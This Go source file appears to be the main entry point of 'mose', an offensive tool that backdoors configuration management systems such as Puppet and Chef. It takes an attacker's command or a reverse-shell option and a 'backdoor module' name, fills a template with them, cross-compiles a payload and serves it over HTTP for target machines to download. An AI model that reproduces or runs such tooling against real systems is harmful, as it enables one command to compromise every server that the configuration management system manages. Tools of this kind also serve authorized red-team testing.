package main

import (
	"context"
	"flag"
	"github.com/fatih/color"
	"github.com/gobuffalo/packr/v2"
	"github.com/l50/mose/pkg/utils"
	"log"
	"path/filepath"
	"strings"
	"text/template"
	//"fmt"
	//"net/http"
	"os"
	"time"
)

var (
	cmd        string
	webSrvPort int = 8090
	cmTarget   string
	errmsg     = color.Red
	msg        = color.Green
	info       = color.Yellow
	osArch     string
	osTarget   string
	localIP    string
	revShell   bool
	modName    string
)

type CliArgs struct {
	BdCmd      string
	OsTarget   string
	ModuleName string
}

// init specifies the input parameters that mose can take.
func init() {
	flag.StringVar(&cmd, "c", "", "Command to run on the targets.")
	flag.StringVar(&localIP, "l", "", "Local IP Address.")
	flag.StringVar(&cmTarget, "t", "puppet", "Configuration management tool to target.")
	flag.StringVar(&osArch, "a", "amd64", "Architecture that the target CM tool is running on.")
	flag.StringVar(&osTarget, "o", "linux", "Operating system that the target CM tool is on.")
	flag.BoolVar(&revShell, "r", false, "Drop into msf reverse shell listener.")
	flag.StringVar(&modName, "m", "my_cmd", "Name for backdoor module")
}

// usage prints the usage instructions for mose.
func usage() {
	os.Args[0] = os.Args[0] + " [options]"
	flag.Usage()
	os.Exit(1)
}

// validateInput ensures that the user inputs proper arguments into mass-wpscan.
func validateInput() bool {
	if cmd == "" && revShell == false {
		errmsg("You must specify a cm target, a command, and an operating system.")
		errmsg("Example: mose -t puppet -c pwd -o Linux")
		errmsg("Alternatively, you can specify a reverse shell instead of a command.")
		errmsg("Example: mose -t chef -revShell -o Linux")
		return false
	}
	return true
}

func generateParams() {
	cliArgs := CliArgs{
		BdCmd:      cmd,
		OsTarget:   osTarget,
		ModuleName: modName,
	}

	box := packr.New("Params", "templates")

	s, err := box.FindString("params.tmpl")

	if err != nil {
		log.Fatal(err)
	}

	t, err := template.New("params").Parse(s)

	if err != nil {
		log.Fatal(err)
	}

	f, err := os.Create("cmd/mose/puppet/params.go")

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, cliArgs)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()
}

func generatePayload() {
	msg("Generating %s payload to run %s on a %s system, please wait...", cmTarget, cmd, strings.ToLower(osTarget))
	prevDir := utils.Gwd()
	utils.Cd(filepath.Clean(filepath.Join("cmd/mose/", cmTarget)))
	cmd := "env GOOS=" + strings.ToLower(osTarget) + " GOARCH=amd64 go build -o " +
		filepath.Join("../../../payloads", cmTarget+"-"+strings.ToLower(osTarget))
	utils.RunCommand(cmd)
	utils.Cd(prevDir)
}

func servePayload(port int) {
	// TODO: Use HTTPS - https://github.com/ryhanson/phishery/blob/master/phish/phishery.go
	if localIP == "" {
		ip, err := utils.GetLocalIP()
		localIP = ip
		if err != nil {
			log.Fatalln(err)
		}
	}
	msg("Payload being served at http://%s:%d/%s-%s for %d seconds", localIP, port, cmTarget, strings.ToLower(osTarget), 60)
	srv := utils.StartHttpServer(port, "payloads")

	time.Sleep(60 * time.Second)

	info("Web server shutting down...")

	if err := srv.Shutdown(context.Background()); err != nil {
		log.Fatalln(err)
	}
}

func main() {
	flag.Parse()

	if flag.NFlag() == 0 || validateInput() == false {
		usage()
	}
	generateParams()
	generatePayload()
	servePayload(webSrvPort)
	if cmTarget == "chef" {
		createUploadRoute()
		setupChefWorkstationContainer()
	}
}
